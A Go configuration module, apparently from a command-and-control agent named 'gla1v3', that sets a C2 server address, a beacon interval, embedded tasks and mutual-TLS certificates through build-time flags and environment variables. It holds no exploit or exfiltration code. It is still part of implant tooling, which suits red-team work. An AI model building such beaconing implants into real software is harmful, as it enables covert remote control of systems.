package config

import (
	"os"
	"time"
)

// Build-time configuration (injected via -ldflags)
var (
	EmbeddedAgentID = ""                    // Agent ID set at build time
	BeaconInterval = "30s"                  // Default beacon interval
	C2Server       = "c2.gla1v3.local:4443" // Default C2 server
	EmbeddedTasks  = "[]"                   // JSON array of tasks to execute
	EmbeddedCACert = ""                     // PEM encoded CA certificate
	EmbeddedCert   = ""                     // PEM encoded client certificate
	EmbeddedKey    = ""                     // PEM encoded client key
	TenantAPIKey   = ""                     // Tenant API key for multi-tenant support
)

// Config holds the runtime configuration for the agent
type Config struct {
	AgentID        string
	C2URL          string
	BeaconInterval time.Duration
	ServerName     string
	APIServerName  string
	WhoamiToken    string
	TenantAPIKey   string
	
	// Certificate paths (for file-based certs)
	CertPath string
	KeyPath  string
	CAPath   string
	
	// Embedded certificates (for compiled-in certs)
	HasEmbeddedCerts bool
}

// Load creates a Config from environment variables and build-time defaults
func Load() *Config {
	cfg := &Config{
		AgentID:       os.Getenv("AGENT_NAME"),
		C2URL:         os.Getenv("C2_URL"),
		ServerName:    os.Getenv("AGENT_SERVER_NAME"),
		APIServerName: os.Getenv("AGENT_API_SERVER_NAME"),
		WhoamiToken:   os.Getenv("AGENT_WHOAMI_TOKEN"),
		CertPath:      os.Getenv("AGENT_CERT_PATH"),
		KeyPath:       os.Getenv("AGENT_KEY_PATH"),
		CAPath:        os.Getenv("AGENT_CA_PATH"),
	}
	
	// Set defaults
	if cfg.AgentID == "" {
		// Use embedded agent ID from build-time if available
		if EmbeddedAgentID != "" {
			cfg.AgentID = EmbeddedAgentID
		} else {
			cfg.AgentID = "agent-" + time.Now().Format("20060102150405")
		}
	}
	
	if cfg.C2URL == "" {
		cfg.C2URL = "https://" + C2Server + "/beacon"
	}
	
	if cfg.ServerName == "" {
		cfg.ServerName = "c2.gla1v3.local"
	}
	
	if cfg.APIServerName == "" {
		cfg.APIServerName = "api.gla1v3.local"
	}
	
	// Parse beacon interval
	beaconInterval, err := time.ParseDuration(BeaconInterval)
	if err != nil {
		beaconInterval = 30 * time.Second
	}
	
	// Override from env var if set
	if v := os.Getenv("BEACON_INTERVAL"); v != "" {
		if iv, err := time.ParseDuration(v); err == nil {
			beaconInterval = iv
		}
	}
	
	cfg.BeaconInterval = beaconInterval
	
	// Set tenant API key from build-time or env var
	cfg.TenantAPIKey = TenantAPIKey
	if v := os.Getenv("TENANT_API_KEY"); v != "" {
		cfg.TenantAPIKey = v
	}
	
	// Check for embedded certificates
	cfg.HasEmbeddedCerts = (EmbeddedCert != "" && EmbeddedKey != "" && EmbeddedCACert != "")
	
	return cfg
}

// GetEmbeddedCerts returns the embedded certificates if available
func GetEmbeddedCerts() (cert, key, ca string, ok bool) {
	if EmbeddedCert == "" || EmbeddedKey == "" || EmbeddedCACert == "" {
		return "", "", "", false
	}
	return EmbeddedCert, EmbeddedKey, EmbeddedCACert, true
}

// GetEmbeddedTasks returns the embedded tasks JSON
func GetEmbeddedTasks() string {
	return EmbeddedTasks
}
